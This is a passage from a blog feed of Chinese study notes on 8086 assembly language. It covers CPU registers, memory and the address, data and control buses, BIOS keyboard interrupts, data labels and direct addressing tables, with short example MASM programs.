        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>汇编语言是直接在硬件之上互作的编程语言</p><p>学会用汇编的思维去使用C语言</p><p>比汇编更底层的  –&gt;  机器语言</p><p>【进制转化】【可以再去学一下】</p><p>【王爽的汇编语言】</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">简单讲是CPU中可以存储数据的器件，一个CPU中有多个寄存</span><br><span class="line">AX</span><br><span class="line">BX</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以后还会讲咯</span><br></pre></td></tr></table></figure><p>程序–&gt;汇编指令–&gt;编译器–&gt;机器码</p><p>汇编语言和机器指令是一一调用的</p><h3 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h3><p>1.汇编语言有3类组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.汇编指令【机器码的助记符】</span><br><span class="line">2.伪指令【由编译器执行】</span><br><span class="line">3.其他符号【由编译器识别】</span><br></pre></td></tr></table></figure><p>2.汇编语言的核心是汇编指令，它决定了汇编语言的特性</p><p>【编码的奥秘】这本书推荐看看。</p><h3 id="储存器"><a href="#储存器" class="headerlink" title="储存器"></a>储存器</h3><p>1.CPU是计算机的核心部件，它控制整个计算机的运作并进行运算，要想让一个CPU互作，就必须向它提供指令和数据</p><p>2.指令和数据在存储器中存放，也就是平时说的内存</p><p>3.在一台PC中的内存的作用仅次于CPU</p><p>4.离开了内存，性能在好的CPU也无法互作</p><p>5.磁盘不同于内存，磁盘上的数据或程序如果不读到内存中，就无法被cpu使用</p><h3 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h3><p>1.指令和数据是应用上的概念</p><p>2.在内存或磁盘上，指令和数据没有任何区别，都是二进制信息</p><p>3.二进制信息：–&gt;【进制转化】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1000100111011000  ==&gt;转成Hex</span><br><span class="line">--&gt;89D8H(数据)</span><br><span class="line">1000100111011000</span><br><span class="line">--&gt;MOV AX,BX(程序)</span><br></pre></td></tr></table></figure><h3 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h3><p>1.储存区被划分为若干个存储单元，每个存储单元从0开始顺序编号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如：一个储存区有128个存储单元，那么编号从0~127</span><br></pre></td></tr></table></figure><p>2.对于大容量的储存区一般还用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KB = 1024B</span><br><span class="line">MB = 1024KB</span><br><span class="line">GB = 1024MB</span><br><span class="line">TB = 1024GB</span><br></pre></td></tr></table></figure><p>3.磁盘的容量单位同内存的一样，实际上以上单位是微机中常用的计量单位</p><h3 id="CPU对储存区的读写"><a href="#CPU对储存区的读写" class="headerlink" title="CPU对储存区的读写"></a>CPU对储存区的读写</h3><p>1.CPU要想进行数据的读写，必须和外部器件（标准的说法是芯片）进行三类信息的交互：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.存储单元的地址（地址信息）</span><br><span class="line">2.器件的选择，读或写命令（控制信息）</span><br><span class="line">3.读或写的数据（数据信息）</span><br></pre></td></tr></table></figure><h3 id="CPU对储存区的读写-1"><a href="#CPU对储存区的读写-1" class="headerlink" title="CPU对储存区的读写"></a>CPU对储存区的读写</h3><p>1.那么CPU是通过什么将地址，数据和控制信息传递到存储芯片的呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">电子计算能处理，传递的信息都是电信号，电信号当然要用导线传送</span><br></pre></td></tr></table></figure><p>2.在计算机中专门有连接CPU和其他芯片的导线【称为总线】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在物理上：一根根导线的集合；</span><br><span class="line">逻辑上划分为：</span><br><span class="line">地址总线</span><br><span class="line">数据总线</span><br><span class="line">控制总线</span><br><span class="line"></span><br><span class="line">通过哪条线过来的数据就当作某来算</span><br><span class="line">就像上面的：</span><br><span class="line">1000100111011000  ==&gt;转成Hex</span><br><span class="line">--&gt;89D8H(数据)  【通过数据总线】</span><br><span class="line">1000100111011000</span><br><span class="line">--&gt;MOV AX,BX(程序)  【通过控制总线】</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230404232205006.png" alt="image-20230404232205006"></p><p>3.CPU是如何进行读和写的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先通过地址总线，找到相对应的地址。</span><br><span class="line">然后通过控制总线，传入要读或者写的命令</span><br><span class="line">最后通过数据总线进行数据上的传递</span><br><span class="line">如果是读，就是从内存上的该地址通过数据总线把内容传递给CPU</span><br><span class="line">写，就是在CPU上通过数据总线找到该地址，写入内存中</span><br></pre></td></tr></table></figure><p>对于8086CPU，下面的机器码能完成从三号单元读数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">机器码：101000000000001100000000</span><br><span class="line">含义：从三号单元读取数据送入寄存器AX</span><br><span class="line">CPU接受这条机器码后将完成上面所述的读写互作</span><br></pre></td></tr></table></figure><h3 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h3><p>1.CPU是通过地址总线来指定存储单元的</p><p>2.地址总线上能传送多少个不同的信息，CPU就可以堆叠多少个存储单元进行寻址</p><p>3.一个CPU有N根地址总线，则可以说整个CPU的地址总线的宽度为N</p><p>4.这样的CPU最多可以寻找2的N次方个内存单元</p><p>5.地址是从下面往上面读</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405103334221.png" alt="image-20230405103334221"></p><p>这样读出来的是1011【前面的补上0】</p><h3 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h3><p>1.CPU与内存或其他器件之前的数据传送是通过数据总线来进行的</p><p>2.数据总线的宽度决定了CPU和外界数据传送速度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">宽度越高，一次传入的数据就越多。</span><br></pre></td></tr></table></figure><h3 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h3><p>1.CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是一个总称，控制总线是一些不同的控制线的集合</p><p>2.有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制</p><p>3.所以，控制总线的宽度决定 看CPU对外部器件的控制能力</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制总线上发送的控制信息</span><br></pre></td></tr></table></figure><p>4.前面所讲的内存读或写的命令是由几根控制线综合发出的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.其中由一根名为读信号输出控制线负责由CPU向外传送读信号，CPU向该控制线上输出低电平表示将要读取数据</span><br><span class="line">2.有一根名为写信号输出控制线负责又CPU向外传送写信号</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>1.汇编指令是机器指令的助记符，同机器指令一一对应</p><p>2.每种CPU都有自己的汇编指令集</p><p>3.CPU可以直接使用的信息在存储器中存放</p><p>4.在存储器中指令和数据没有任何区别都是二进制信息</p><p>5.存储单元从零开始顺序编号</p><p>6.一个存储单元可以存储8个bit，即8位二进制数。</p><p>7.每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出三种总线的宽度标志了这个CPU不同方面的性能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.地址总线的宽度决定了CPU的寻址能力；</span><br><span class="line">2.数据总线的宽度决定了CPU与其他器件进行数据传送时的一次数据传送量；</span><br><span class="line">3.控制总线宽度决定了CPU对系同种其他器件的控制能力</span><br></pre></td></tr></table></figure><p>8.在汇编课程中，我们从功能的角度介绍了这三类中线，对实际的连接情况不做讨论。</p><h3 id="内存地址空间（概述）"><a href="#内存地址空间（概述）" class="headerlink" title="内存地址空间（概述）"></a>内存地址空间（概述）</h3><p>1.上面是内存地址空间？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个CPU的地址线宽度为10，那么可以寻址1024个内存单元，这1024可寻到的内存单元就构成了这个CPU的内存地址空间</span><br></pre></td></tr></table></figure><p>2.主板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在每一台PC机中，都有一个主板，主板上有核心器件和一些主要器件</span><br><span class="line">2.这些器件通过总线（地址，数据，控制）相连接</span><br></pre></td></tr></table></figure><p>3.接口卡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.计算机系统中，所有可用程序控制其互作的设备，必修收到CPU的控制</span><br><span class="line">2.CPU对外部设备不能直接控制。直接控制这些设备进行互作的是插在扩展插槽上的接口卡</span><br></pre></td></tr></table></figure><p>4.各类储存区芯片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.从读写属性上看分为2类：</span><br><span class="line">随机存储器（RAM）【比如内存】和只读存储器（ROM）</span><br><span class="line"></span><br><span class="line">2.从功能和连接上分类：</span><br><span class="line">随机存储器RAM</span><br><span class="line">装有BIOS的ROM</span><br><span class="line">BIOS：基本输入输出系统</span><br><span class="line">BIOS：是由主板和各类接口卡（比如：显卡，网卡...）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插由存储相应的BIOS的ROM</span><br><span class="line">接口上的RAM</span><br><span class="line">PC机中各类存储器的逻辑相连接情况</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405125056876.png" alt="image-20230405125056876"></p><h3 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h3><p>1.上述的拿下存储器在物理上是独立的器件</p><p>2.但是它们在一下俩点上是相同的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.都和CPU的总线相连</span><br><span class="line">2.CPU对他们进行读或写的时候都通过控制线发出内存读写命令</span><br></pre></td></tr></table></figure><p>3.将各类存储器看作一个逻辑存储器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器；</span><br><span class="line">2.每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间；</span><br><span class="line">3.CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据</span><br><span class="line"></span><br><span class="line">每一个PC的内存地址空间都是不一样的</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405125649612.png" alt="image-20230405125649612"></p><p>内存地址空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.最终运行的程序都是CPU，我们用汇编编程的时候，必须要从CPU角度考虑问题</span><br><span class="line">2.核心思维</span><br><span class="line">3.对CPU来讲，系统中的所有存储器中的存储单元都是处于一个统一的逻辑存储器中，它的容量受到CPU寻址能力的限制。这个逻辑存储器即是我们所说的内存地址空间</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-使用BIOS进行键盘和磁盘的读写（17）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-17-%E4%BD%BF%E7%94%A8BIOS%E8%BF%9B%E8%A1%8C%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E5%92%8C%E7%A3%81%E7%9B%98%E8%AF%BB%E5%86%99/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-17-%E4%BD%BF%E7%94%A8BIOS%E8%BF%9B%E8%A1%8C%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E5%92%8C%E7%A3%81%E7%9B%98%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>大多数有用的程序都需要处理用户的输入，家农安的输入是最基本的输入</p><p> 程序和数据通常需要长期存储，磁盘是我们常用的存储设备。BIOS为这两种外设的I/O提供了最基本的中断例程</p><h2 id="1-int-9-中断例程对键盘输入的处理"><a href="#1-int-9-中断例程对键盘输入的处理" class="headerlink" title="1.int 9 中断例程对键盘输入的处理"></a>1.int 9 中断例程对键盘输入的处理</h2><p>CPU在9号中断发生后，执行int 9 中断例程，从60H端口读出扫描码，并将其转化为相应的SCII码或状态信息，存储在内存的指定空间【键盘缓冲区或状态字节】种</p><p>所以，一般的键盘输入，在CPU执行完int 9 中断例程后，都放到了键盘缓冲区中</p><h2 id="2-使用int-16h中断例程读取键盘缓冲区"><a href="#2-使用int-16h中断例程读取键盘缓冲区" class="headerlink" title="2.使用int 16h中断例程读取键盘缓冲区"></a>2.使用int 16h中断例程读取键盘缓冲区</h2><p>BIOS提供了int 16h 中断例程供程序员调用</p><p>int 16h 中断例程中包含的一个最重要的功能是从键盘缓冲区中读取一个键盘输入，该功能的编号为0</p><p>下面的指令从键盘缓冲区中读取一个键盘输入，并将其从缓冲区删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ah,0</span><br><span class="line">int 16h</span><br><span class="line">结果：</span><br><span class="line">(ah)=扫描码,(al)=ASCII码</span><br></pre></td></tr></table></figure><p>int 16h 中断例程的0号功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.检测键盘缓冲区中是否有数据</span><br><span class="line">2.没有则继续做第一步</span><br><span class="line">3.读取缓冲区第一个字单元中的键盘输入</span><br><span class="line">4.将读取的扫码送入ah，ASCII码送入al中</span><br><span class="line">5.将已读取的键盘输入从缓冲区中删除</span><br></pre></td></tr></table></figure><p>所以 int 9和int 16h中断例程是一对相互配合的程序，int 9中断例程向键盘缓冲区写入，int 16h中断例程从缓冲区中读出</p><p>它们写入和读出的时机不同，int 9 中断例程在有健按下的时候向键盘缓冲区写入数据</p><p>而int 16h中断例程是在应用程序对其进行调用的时候，将数据从键盘缓冲区读出来</p><h2 id="3-字符串的输入"><a href="#3-字符串的输入" class="headerlink" title="3.字符串的输入"></a>3.字符串的输入</h2>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-直接定址表（16）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-16-%E7%9B%B4%E6%8E%A5%E5%AE%9A%E5%9D%80%E8%A1%A8/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-16-%E7%9B%B4%E6%8E%A5%E5%AE%9A%E5%9D%80%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-描述了单元长度的标号"><a href="#1-描述了单元长度的标号" class="headerlink" title="1.描述了单元长度的标号"></a>1.描述了单元长度的标号</h2><p>一般来说，普通的标号仅仅代表了内存单元的地址</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">a: db 1,2,3,4,5,6,7,8</span><br><span class="line">b: dw 0</span><br><span class="line">start:</span><br><span class="line">mov si,offset a</span><br><span class="line">mov bx,offset b</span><br><span class="line">mov cx,8</span><br><span class="line">s:</span><br><span class="line">mov al,cs:[si]</span><br><span class="line">mov ah,0</span><br><span class="line">add cs:[bx],ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>还有一种标号，还可以表示内存的单元长度</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">start:</span><br><span class="line">mov si,offset a</span><br><span class="line">mov bx,offset b</span><br><span class="line">mov cx,8</span><br><span class="line">s:</span><br><span class="line">mov al,cs:[si]</span><br><span class="line">mov ah,0</span><br><span class="line">add cs:[bx],ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>在code段中使用的标号a和b中没有:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这就说明了:</span><br><span class="line">标号a:描述了地址code:0和从这个地址开始，以后的内存单元都是字节单元</span><br><span class="line">标号b:描述了地址code:8和从这个地址开始，以后的内存单元都是字单元</span><br></pre></td></tr></table></figure><p>这样就nb了</p><p>比如：对于程序中的b dw 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">指令:mov ax,b 相当于：mov ax,cs:[8]</span><br><span class="line">指令:mov b,2 相当于： mov word ptr cs:[8],2</span><br><span class="line">指令:inc b 相当于： inc word ptr cs:[8]</span><br></pre></td></tr></table></figure><p>再比如：对于程序中的 a db 1,2,3,4,5,6,7,8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,a[si]相当于 mov al,cs:0[si]</span><br><span class="line">mov al,a[3]相当于mov al,cs:0[3]</span><br><span class="line">mov al,a[bx+si+3]相当于 mov al,cs:0[bx+si+3]</span><br></pre></td></tr></table></figure><p>这种标号叫做数据标号，它标记了存储数据的单元的地址和长度【字？字节？】</p><p>【我咋感觉这个和数组差不多，数组首地址……】</p><h2 id="2-再其他段中使用数据标号"><a href="#2-再其他段中使用数据标号" class="headerlink" title="2.再其他段中使用数据标号"></a>2.再其他段中使用数据标号</h2><p>1.一般来说：我们不在代码段中定义数据，而是将数据定义到其他段中。再其他段中，我们也可以使用数据标号来描述存储数据的单元的地址和长度</p><p>注意：再后面又” : “ 的地址标号，只能再代码段中使用，不能再其他段中使用</p><p>下面的程序将data段中a标号处的8个数据累加，结果存储到b标号处的字中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segemnt </span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:</span><br><span class="line">mov al,a[si]</span><br><span class="line">mov ah,0;这个可以扔到外面去吧？</span><br><span class="line">add b,ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>注意：如果想在代码段中，直接使用数据标号访问数据，则需要用伪指令assume将标号所在的段和一个段寄存器联系起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data....</span><br></pre></td></tr></table></figure><p>2.可以将标号当作数据来定义，此时，编译器将标号所表示的地址当作数据的值</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dw a,b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>相当于:数据标号存储的2个字型数据为标号a b的偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dw offset a,offset b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dd a,b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>相当于：c处存储的2个双字数据为标号a的偏移地址和段地址，标号b的偏移地址和段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dd offset a, seg a, offset b, seg b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seg操作符，功能是取得某一个标号的段地址</span><br></pre></td></tr></table></figure><h2 id="3-直接定址表"><a href="#3-直接定址表" class="headerlink" title="3.直接定址表"></a>3.直接定址表</h2><p>需要用到多种映射关系的时候，我们可以将它制成一张表，这样有利于我们查找</p><p>比如：0<del>15和字符0</del>f之间建立一个映射关系</p><p>思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以数值N为table表中的偏移来找到对应的字符</span><br></pre></td></tr></table></figure><p>子程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">;用 al 传送要显示的数据</span><br><span class="line">showbyte:</span><br><span class="line">jmp short show</span><br><span class="line">table db &#x27;0123456789ABCDEF&#x27;;建立表单</span><br><span class="line"></span><br><span class="line">show:</span><br><span class="line">;设置子程序</span><br><span class="line">push bx</span><br><span class="line">push es</span><br><span class="line"></span><br><span class="line">mov ah,al</span><br><span class="line">mov bl,4</span><br><span class="line">shr ah,bl;右移4位，ah中得到高4位的值</span><br><span class="line">and al,00001111b;al为低4位</span><br><span class="line"></span><br><span class="line">mov bl,ah</span><br><span class="line">mov bh,0</span><br><span class="line">mov ah,table[bx];用高4位的值作为table的偏移，取得相应的字符</span><br><span class="line"></span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov es:[160*12+40*2],ah</span><br><span class="line"></span><br><span class="line">mov bl,al</span><br><span class="line">mov bh,0</span><br><span class="line">mov al,table[bx];用低4位作为相对于table的偏移，取得相对于的字符</span><br><span class="line"></span><br><span class="line">mov es:[160*12+40*2+2],al</span><br><span class="line"></span><br><span class="line">pop es</span><br><span class="line">pop bx</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-程序入口地址的直接定址表"><a href="#4-程序入口地址的直接定址表" class="headerlink" title="4.程序入口地址的直接定址表"></a>4.程序入口地址的直接定址表</h2><p>首先就是说：我们可以将这些字功能的入口地址存储再一个表中，它们在表中的位置和功能号相对应。</p><p>来设计功能吧</p><p>1.清屏：也就是将显存中当前屏幕中的字符串设为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sub1:</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push es</span><br><span class="line">mov bx,0b800H</span><br><span class="line">mov es,bx</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,2000</span><br><span class="line">subls:</span><br><span class="line">mov byte ptr es:[bx],&#x27; &#x27;</span><br><span class="line">add bx,2</span><br><span class="line">loop subls</span><br><span class="line"></span><br><span class="line">pop es</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>2.设置前景色:设置显存中当前屏幕中处于奇地址的属性字节的第0，1，2位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 